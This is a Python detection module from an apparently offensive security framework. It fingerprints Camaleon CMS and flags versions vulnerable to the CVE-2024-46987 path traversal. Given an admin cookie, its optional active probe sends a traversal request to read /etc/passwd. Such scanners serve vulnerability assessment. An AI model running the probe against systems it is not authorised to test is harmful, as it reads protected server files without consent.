#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re

from kittysploit import *
from lib.protocols.http.camaleon_cve_2024_46987 import (
    auth_token_cookie_dict,
    camaleon_download_private_path,
    camaleon_page_path,
    normalize_camaleon_base_path,
    response_body_suggests_passwd_read,
    response_ok_for_traversal_probe,
    traversal_param_etc_passwd,
)
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):

    __info__ = {
        "name": "Camaleon CMS CVE-2024-46987 (path traversal) detection",
        "description": (
            "Fingerprints Camaleon CMS and heuristically flags versions ≤ 2.9.0 as affected by "
            "CVE-2024-46987 (authenticated path traversal in /admin/media/download_private_file). "
            "Optional AUTH_TOKEN runs a safe read probe of /etc/passwd when credentials are available."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2024-46987",
        "references": [
            "https://github.com/owen2345/camaleon-cms",
            "https://github.com/owen2345/camaleon-cms/releases/tag/2.9.0",
        ],
        "modules": [
            "auxiliary/admin/http/camaleon_cms_cve_2024_46987_traversal",
        ],
        "tags": ["web", "scanner", "camaleon", "rails", "lfi", "path-traversal", "cve-2024-46987"],
    }

    base_path = OptString("/", "Camaleon base URL path", required=False)
    auth_token = OptString(
        "",
        "Optional admin auth_token cookie for active traversal probe (/etc/passwd)",
        required=False,
    )
    depth = OptInteger(7, "Traversal depth for active probe (same as auxiliary default)", required=False, advanced=True)

    _VERSION_RES = (
        re.compile(r"camaleon[_\s-]?cms[^0-9]{0,40}(\d+\.\d+\.\d+)", re.I),
        re.compile(r"camaleon[^0-9]{0,20}(\d+\.\d+\.\d+)", re.I),
        re.compile(r'["\']camaleon[_\s-]?(\d+\.\d+\.\d+)["\']', re.I),
        re.compile(r"version[^0-9]{0,24}(\d+\.\d+\.\d+)", re.I),
    )

    def _prefix(self) -> str:
        return normalize_camaleon_base_path(self.base_path)

    def _page_path(self, suffix: str) -> str:
        return camaleon_page_path(self.base_path, suffix)

    @staticmethod
    def _version_tuple(v: str):
        parts = []
        for t in str(v).split("."):
            digits = "".join(c for c in t if c.isdigit())
            parts.append(int(digits) if digits else 0)
        while len(parts) < 3:
            parts.append(0)
        return tuple(parts[:3])

    def _version_lte(self, v: str, limit: str = "2.9.0") -> bool:
        return self._version_tuple(v) <= self._version_tuple(limit)

    def _extract_version(self, body: str) -> str:
        if not body:
            return ""
        for rx in self._VERSION_RES:
            m = rx.search(body)
            if m:
                return m.group(1)
        return ""

    def _fingerprint_camaleon(self, body: str) -> bool:
        if not body:
            return False
        low = body.lower()
        if "camaleon" in low:
            return True
        if "camaleon_cms" in low:
            return True
        if "/camaleon/" in low and ("gem" in low or "rails" in low):
            return True
        return False

    def _probe_traversal(self) -> bool:
        cookies = auth_token_cookie_dict(self.auth_token)
        if not cookies:
            return False
        depth = max(1, int(self.depth or 7))
        file_param = traversal_param_etc_passwd(depth)
        path = camaleon_download_private_path(self.base_path, file_param)
        resp = self.http_request(
            method="GET",
            path=path,
            cookies=cookies,
            allow_redirects=False,
            timeout=15,
        )
        if not response_ok_for_traversal_probe(resp):
            return False
        return response_body_suggests_passwd_read(resp.text or "")

    def run(self):
        try:
            bodies = []
            for rel in ("/", "/admin/login", "/admin"):
                r = self.http_request(method="GET", path=self._page_path(rel), allow_redirects=True, timeout=15)
                if r and r.status_code == 200 and r.text:
                    bodies.append(r.text)

            if not bodies:
                return False

            combined = "\n".join(bodies)
            if not self._fingerprint_camaleon(combined):
                return False

            version = self._extract_version(combined)

            if str(self.auth_token or "").strip() and self._probe_traversal():
                self.set_info(
                    severity="critical",
                    cve="CVE-2024-46987",
                    reason=(
                        "Camaleon CMS detected; authenticated traversal read of /etc/passwd succeeded "
                        f"(version hint: {version or 'unknown'})"
                    ),
                    version_hint=version or None,
                )
                return True

            if version:
                if self._version_lte(version, "2.9.0"):
                    self.set_info(
                        severity="high",
                        cve="CVE-2024-46987",
                        reason=(
                            f"Camaleon CMS version hint {version} (≤ 2.9.0) — likely affected; "
                            "confirm with admin auth_token via auxiliary module"
                        ),
                        version_hint=version,
                    )
                    return True
                print_status(f"Camaleon version hint {version} (> 2.9.0); likely patched for CVE-2024-46987")
                return False

            self.set_info(
                severity="medium",
                cve="CVE-2024-46987",
                reason=(
                    "Camaleon CMS fingerprint without reliable version; "
                    "set AUTH_TOKEN for active check or use auxiliary with admin session"
                ),
            )
            return True
        except Exception as e:
            print_error(f"Scanner failed: {e}")
            return False
